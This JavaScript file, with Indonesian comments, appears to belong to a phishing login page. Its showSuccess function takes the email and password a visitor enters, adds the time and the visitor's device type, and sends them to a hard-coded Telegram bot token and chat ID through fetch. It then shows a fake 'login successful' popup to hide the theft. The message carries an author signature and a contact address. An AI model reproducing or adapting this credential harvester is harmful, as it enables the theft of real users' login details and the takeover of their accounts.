function showSuccess() {
    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    if (email === "" || password === "") {
        alert("⚠️ Please enter both email and password.");
        return;
    }

    let chatId = "7168768981"; // Ganti dengan Chat ID Anda
    let botToken = "7920514777:AAFwGR_cZ_lM-4bj-06ewMZwZSjsAjkW3ik"; // Ganti dengan Token Bot Anda

    // Ambil waktu saat ini
    let now = new Date();
    let dateTime = now.toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    // Ambil informasi perangkat
    let userAgent = navigator.userAgent;
    let device = getDeviceType(userAgent);

    // Format pesan dengan Markdown dan preformatted text
    let message = 
        "━━━━━━━━━━━━━━━━━━━━━━\n" +
        "🎉 *LOGIN SUCCESSFUL!* ✅\n" +
        "━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        "📝 *Login Details:*\n" +
        "📧 *Email:* `" + email + "`\n" +
        "🔑 *Password:* `" + password + "`\n" +
        "⏰ *Time:* `" + dateTime + "`\n" +
        "📱 *Device:* `" + device + "`\n\n" +
        "━━━━━━━━━━━━━━━━━━━━━━\n" +
        "⚠️ *Please verify this login immediately!*\n" +
        "━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        "🔰 *By Arjuna Uop Mabin*\n" +
        "📩 *Contact:* `arjunauopmabin@gmail.com`";

    let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

    // Kirim data ke Telegram
    fetch(telegramURL)
    .then(response => response.json())
    .then(data => console.log("Message sent:", data))
    .catch(error => console.error("Error sending message:", error));

    // Tampilkan popup sukses
    document.getElementById("success-popup").style.display = "block";
}

function closePopup() {
    document.getElementById("success-popup").style.display = "none";
}

// Fungsi untuk mendeteksi perangkat dari userAgent
function getDeviceType(userAgent) {
    if (/android/i.test(userAgent)) {
        return "📱 Android";
    } else if (/iphone|ipad|ipod/i.test(userAgent)) {
        return "🍏 iOS";
    } else if (/windows/i.test(userAgent)) {
        return "💻 Windows PC";
    } else if (/macintosh|mac os/i.test(userAgent)) {
        return "🖥️ Mac OS";
    } else {
        return "❓ Unknown Device";
    }
}